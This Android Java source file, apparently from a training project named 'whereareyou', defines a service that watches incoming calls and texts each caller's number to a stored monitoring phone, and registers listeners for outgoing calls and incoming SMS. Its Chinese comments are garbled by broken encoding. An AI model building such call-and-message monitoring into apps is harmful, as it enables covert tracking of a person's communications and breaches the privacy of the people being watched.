package cn.tedu.whereareyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

//�������������ѡ��ع��ܵĿ������߹رղ���
public class WayService extends Service {
	//�����ع����������Դ����
	PhoneStateListener psl;
	TelephonyManager tm;
	ToPhoneListenerReceiver tplr;
	IntentFilter tplif;
	MessageListenerReceiver mlr;
	IntentFilter mlif;
	//��ʼ����ѡ��ع�����Դ����
	public void onCreate(){
		super.onCreate();
		Toast.makeText(WayService.this,"���ڳ�ʼ����ѡ��ع���...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			psl = new PhoneStateListener(){
				@Override
				public void onCallStateChanged(int state, String incomingNumber) {
					// TODO Auto-generated method stub
					super.onCallStateChanged(state, incomingNumber);
					//�жϣ������������ֻ����壬˵�����磬��Ҫ��ʼ׼�����������ز���
					if(state==TelephonyManager.CALL_STATE_RINGING){
						//�жϣ����������벻�Ǽ���ߣ��Ž���������
						if(!incomingNumber.endsWith(WayInformations.LPPN)){
							//�����߷��ͼ�ض���
							//��ö��Ź���������
							SmsManager sm = SmsManager.getDefault();
							//׼�����ݣ�ȥ�ź���+ȥ�����ݣ�
							String message = incomingNumber + "is Called Phone to TA";
							//���Ͷ���
							sm.sendTextMessage(WayInformations.LPPN, null, message, null, null);
						}
						
					}
				}
			};
			tm = (TelephonyManager)this.getSystemService(Context.TELEPHONY_SERVICE);
		}
		if(WayInformations.isQPL){
			tplr =new ToPhoneListenerReceiver();
			tplif = new IntentFilter();
		}
		if(WayInformations.isMSG){
			mlr = new MessageListenerReceiver();
			mlif = new IntentFilter();
		}
	}
	//������ѡ��ع��ܣ�ִ����startActivity(it);�������Զ�����ִ�У�
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		Toast.makeText(WayService.this,"���ڿ�����ѡ��ع���...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			tm.listen(psl, PhoneStateListener.LISTEN_CALL_STATE);
		}
		if(WayInformations.isQPL){
			tplif.addAction("android.intent.action.NEW_OUTGOING_CALL");
			this.registerReceiver(tplr, tplif);
		}
		if(WayInformations.isMSG){
			mlif.addAction("android.provider.Telephony.SMS_RECEIVED");
			this.registerReceiver(mlr, mlif);
		}
		return super.onStartCommand(intent, flags, startId);
	}
	//�ر���ѡ��ع��ܣ�ִ����stopActivity(it);�������Զ�����ִ�У�
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		Toast.makeText(WayService.this,"���ڹر���ѡ��ع���...",Toast.LENGTH_LONG).show();
		if(WayInformations.isFPL){
			tm.listen(psl, PhoneStateListener.LISTEN_NONE);
			WayInformations.isFPL = false;
		}
		if(WayInformations.isQPL){
			this.unregisterReceiver(tplr);
			WayInformations.isQPL = false;
		}
		if(WayInformations.isMSG){
			this.unregisterReceiver(mlr);
			WayInformations.isMSG = false;
		}
	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

}
